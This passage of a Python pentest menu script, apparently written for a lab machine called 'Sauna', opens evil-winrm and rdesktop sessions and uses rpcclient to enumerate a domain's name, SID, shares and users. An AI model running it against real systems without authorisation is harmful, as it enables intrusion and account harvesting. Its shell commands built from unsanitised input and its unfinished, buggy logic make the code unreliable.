      command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='65':
      command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='67':
      exit(1) 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Sauna
# Details : Menu option selected - Autofill data.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      DOM = " "*COL1
      SID = " "*COL1

      print("\n[*] Attempting to enumerate domain name...")
      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > temp.txt")

      test1 = linecache.getline("temp.txt", 1)
      if test1[:6] != "Cannot":
         try:
            temp,DOM = test1.split(":")
         except ValueError:
            DOM = "Error..."
         DOM = DOM.strip(" ")
         if len(DOM) < COL1:
            DOM = padding(DOM, COL1)
         print("[+] Found domain", DOM)
         command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
         print("\n[*] Domain " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
      else:
         print("[-] Unable to enumerate domain name...")      

      print("\n[*] Attempting to enumerate domain SID...")
      test2 = linecache.getline("temp.txt", 2)
      if test2[:6] != "Cannot":
         try:
            temp,SID = test2.split(":")
         except ValueError:
            SID = "Error..."
         SID = SID.strip(" ")
         if len(SID) < COL1:
            SID = padding(SID, COL1)
         print("[+] Found SID", SID)
      else:
         print("[-] Unable to enumerate SID...") 

      os.remove("temp.txt")

# -------------------------------------------------------------------------------------
    
      SH0  = " "*COL2  					# Clean SHARE Values
      SH1  = " "*COL2
      SH2  = " "*COL2
      SH3  = " "*COL2
      SH4  = " "*COL2
      SH5  = " "*COL2
      SH6  = " "*COL2
      SH7  = " "*COL2
      SH8  = " "*COL2
      SH9  = " "*COL2
      SH10 = " "*COL2
      SH11 = " "*COL2
      SHA0  = " "*COL2
      SHA1  = " "*COL2
      SHA2  = " "*COL2
      SHA3  = " "*COL2
      SHA4  = " "*COL2
      SHA5  = " "*COL2
      SHA6  = " "*COL2
      SHA7  = " "*COL2
      SHA8  = " "*COL2
      SHA9  = " "*COL2
      SHA10 = " "*COL2
      SHA11 = " "*COL2 

      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.txt")

      print("[*] Attempting to enumerate shares...")
      test3 = linecache.getline("shares.txt", 1)
      if test3[:9] != "Could not" and test3[:6] != "result":
         command("cat shares.txt")
      else:
         print("[-] Unable to enumerate shares...")

      # MORE CODE REQUIRED HERE TO COLLECT AND DISPLAY THE SHARE NAMES

      os.remove("shares.txt")

# -------------------------------------------------------------------------------------

      for x in range (0, MAXX):
         USER[x] = " "*COL3
         PASS[x] = " "*COL4
    
      command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.txt")      

      print("\n[*] Attempting to enumerate domain users...")
      test4 = linecache.getline("domusers.txt", 1)
      if test4[:9] != "Could not" and test4[:6] != "result":
         command("cat domusers.txt | wc -l > count.txt")
         count = int(linecache.getline("count.txt", 1))
      else:
         print("[-] Unable to enumerate domain users...")

      command("sort domusers.txt > domusers.tmp")
      os.remove("domusers.txt")
      os.remove("count.txt")
      os.remove("users.txt")
      command("mv domusers.tmp domusers.txt")      

      for x in range(0, count):
         test5 = linecache.getline("domusers.txt", x + 1)
         try:
            temp1,temp2,temp3 = test5.split(":");
         except ValueError:
            temp2 = "Error..."
         USER[x] = temp2
         USER[x] = USER[x].replace("[","")
         USER[x] = USER[x].replace("]","")
         USER[x] = USER[x].replace("rid","")
         print ("[+] Found user", USER[x])

         if len(USER[x]) < COL3:
            USER[x] = padding(USER[x], COL3)		# Populate new values.
         command("echo " + USER[x] + " >> users.txt")

      os.remove("domusers.txt")
      prompt()

# -------------------------------------------------------------------------------------
# Eof...	
